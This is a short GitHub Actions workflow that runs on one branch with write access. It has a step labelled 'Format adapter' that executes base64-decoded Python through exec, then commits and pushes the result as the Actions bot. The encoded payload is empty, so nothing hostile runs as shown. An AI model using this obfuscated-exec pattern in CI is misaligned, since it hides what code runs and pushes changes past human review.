name: Format P0B progress adapter

"on":
  push:
    branches:
      - improve/p0b-schedule-transactions

permissions:
  contents: write

jobs:
  apply:
    if: "${{ github.actor != 'github-actions[bot]' && !contains(github.event.head_commit.message, '[p0b-format-progress]') }}"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: improve/p0b-schedule-transactions
          fetch-depth: 0
      - name: Format adapter
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Commit format
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "style: format progress adapter [p0b-format-progress]"
          git push origin HEAD:improve/p0b-schedule-transactions
